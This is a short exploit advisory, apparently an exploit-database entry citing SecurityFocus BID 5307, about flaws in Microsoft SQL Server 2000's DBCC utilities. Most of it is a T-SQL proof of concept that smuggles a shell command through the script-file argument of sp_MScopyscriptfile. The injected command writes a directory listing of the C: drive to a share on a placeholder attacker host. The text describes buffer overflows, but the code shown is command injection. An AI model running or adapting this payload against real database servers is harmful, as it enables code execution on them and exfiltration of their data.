@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/5307/info
+
+Microsoft SQL Server 2000 includes utilities called Database Consistency Checkers (DBCC). Several of these programs contain identical buffer overflows that, when exploited, could allow an attacker to execute arbitrary code with the privilege level of the SQL Server service account.
+
+declare @command varchar(100)
+declare @scripfile varchar(200)
+set concat_null_yields_null off
+select @command='dir c:\ >
+"\\attackerip\share\dir.txt"'
+select @scripfile='c:\autoexec.bat > nul" | ' +
+@command + ' | rd "' 
+exec sp_MScopyscriptfile @scripfile ,''
